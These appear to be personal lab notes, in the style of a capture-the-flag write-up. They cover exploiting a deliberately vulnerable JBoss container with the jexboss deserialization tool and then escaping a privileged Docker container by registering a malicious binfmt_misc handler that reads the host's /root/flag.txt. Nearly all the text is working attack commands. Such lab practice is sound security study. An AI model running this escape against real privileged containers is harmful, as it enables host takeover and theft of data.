# jboss + binfmt_misc

- Vulapp
    - container
        - https://vulapps.evalbug.com/j_jboss_1/
        - start command: docker run --rm -d -p 8080:8080 --privileged --name jboss medicean/vulapps:j_jboss_1
    - hack method
        - java 反序列化
            - 我不會寫payload
            - 用工具 https://github.com/joaomatosf/jexboss
            - Use command: python3 jexboss.py -D --jboss -host http://127.0.0.1:8080

- Breakout Privileged
    - all
    - actually CAP_ADMIN

- Breakout payload
    - mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc
    - mount | grep upperdir 
    - (change the dir in later commands "/var/lib/......../tmp")
    - cd tmp
    - echo '#!/bin/bash' > test.sh
    - echo '' >> test.sh
    - echo 'cat /root/flag.txt > /var/lib/docker/overlay2/ac43a4775e3f5db566b90edff240df6a2e976b2c7a85359bb43b89946713f48a/diff/tmp/flag.txt' >> test.sh
    - chmod +x test.sh
    - echo ':test:M:208:\x28\x34::/var/lib/docker/overlay2/ac43a4775e3f5db566b90edff240df6a2e976b2c7a85359bb43b89946713f48a/diff/tmp/test.sh:' > /proc/sys/fs/binfmt_misc/register
    - (change to host root and use ls command)
    - echo -1 > /proc/sys/fs/binfmt_misc/status
    - ls
    
- replace "ls" command of the kernel